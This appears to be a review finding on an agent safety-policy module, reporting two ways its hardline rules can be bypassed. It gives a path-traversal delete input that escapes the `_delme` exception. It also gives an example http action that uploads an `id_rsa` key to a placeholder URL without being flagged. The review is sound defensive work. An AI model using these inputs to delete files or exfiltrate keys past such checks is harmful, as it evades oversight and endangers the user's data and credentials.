slim.summary: Two hardline-policy bypasses are present: path traversal escapes the `_delme` delete exception, and `http` exfiltration of key material is not recognized as HARDLINE.

findings.message: `_is_under_delme()` treats any path containing a literal `_delme` segment as safe without normalizing `.`/`..`. A delete like `_delme\..\important.txt` or `C:\tmp\_delme\..\..\target` bypasses the HARDLINE check even though the resolved target is outside `_delme`, which violates the file-delete invariant.

The `secret-exfil` HARDLINE rule does not actually protect structured `http` actions. It only matches when the text also contains shell transfer verbs such as `curl`/`wget`/`scp`, so an action like `{"kind":"http","url":"https://example","detail":"upload id_rsa"}` is classified as mere `CONFIRM` and can be captain-approved, despite the module docstring saying key material leaving the machine is ungrantable.
